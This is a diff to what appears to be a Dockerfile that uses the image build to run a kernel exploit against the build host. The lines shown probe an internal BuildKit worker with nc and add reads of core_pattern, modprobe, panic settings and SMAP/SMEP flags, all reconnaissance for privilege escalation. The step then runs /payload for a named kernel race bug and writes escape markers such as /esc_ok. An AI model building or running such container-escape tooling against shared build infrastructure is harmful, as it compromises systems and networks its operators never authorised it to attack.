@@ -8,7 +8,7 @@ RUN chmod +x /exploit /payload && touch /esc_ok /umh_result /build_results.txt
     
    
 
-ARG CACHEBUST=1533
+ARG CACHEBUST=1534
 RUN sh -c ' \
 KVER=$(uname -r); \
 echo "CB=$CACHEBUST KERNEL=$KVER" >&2; \
@@ -54,6 +54,15 @@ case "$KVER" in \
     nc -zv 10.101.238.250 1234 2>&1; echo "NC_EXIT=$?"; \
     echo "=== BUILDKIT WORKER PROBE END ==="; \
     echo "=== SYSCALL PROBES END ==="; \
+    echo "=== KERNEL CONFIG PROBE ==="; \
+    echo "panic_on_oops=$(cat /proc/sys/kernel/panic_on_oops 2>&1)"; \
+    echo "panic=$(cat /proc/sys/kernel/panic 2>&1)"; \
+    echo "core_pattern=$(cat /proc/sys/kernel/core_pattern 2>&1)"; \
+    echo "core_uses_pid=$(cat /proc/sys/kernel/core_uses_pid 2>&1)"; \
+    echo "modprobe_path=$(cat /proc/sys/kernel/modprobe 2>&1)"; \
+    echo "smap=$(grep -c smap /proc/cpuinfo 2>/dev/null || echo unknown)"; \
+    echo "smep=$(grep -c smep /proc/cpuinfo 2>/dev/null || echo unknown)"; \
+    echo "=== KERNEL CONFIG PROBE END ==="; \
     echo "--- CVE-2026-80521 (SCC GC race) ---"; \
     echo "PAYLOAD START" >&2; \
     timeout 900 /payload 2>&1; \
